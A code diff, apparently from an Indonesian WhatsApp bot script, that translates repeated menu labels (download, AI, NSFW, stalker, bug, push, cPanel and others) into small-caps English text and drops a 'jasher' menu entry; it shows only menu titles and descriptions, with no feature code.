-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -7972,186 +7933,181 @@ break
 case 'nsfwmenu': {
   let HydroSad = `${nsfwmenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -8164,186 +8120,181 @@ break
 case 'animemenu': {
   let HydroSad = `${animemenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -8356,186 +8307,181 @@ break
 case 'jashermenu': {
   let HydroSad = `${jashermenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
